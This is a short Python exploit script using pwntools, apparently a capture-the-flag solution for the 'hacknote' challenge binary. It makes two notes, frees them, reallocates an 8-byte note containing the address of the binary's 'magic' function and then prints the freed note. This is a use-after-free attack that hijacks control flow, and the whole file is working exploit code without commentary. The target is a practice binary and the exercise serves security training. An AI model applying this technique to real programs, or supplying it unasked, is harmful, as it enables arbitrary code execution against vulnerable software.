#!/usr/bin/env python
from pwn import *
p = process('./hacknote')
elf = ELF('./hacknote')

def addnote(size, content):
    p.recvuntil(':')
    p.sendline('1')
    p.recvuntil(':')
    p.sendline(str(size))
    p.recvuntil(':')
    p.sendline(content)

def delnote(idx):
    p.recvuntil(':')
    p.sendline('2')
    p.recvuntil(':')
    p.sendline(str(idx))

def printnote(idx):
    p.recvuntil(':')
    p.sendline('3')
    p.recvuntil(':')
    p.sendline(str(idx))

# gdb.attach(p)
magic = elf.symbols['magic']
addnote(32, 'aaaa')
addnote(32, 'bbbb')
delnote(0)
delnote(1)
addnote(8, p32(magic))
printnote(0)
p.interactive()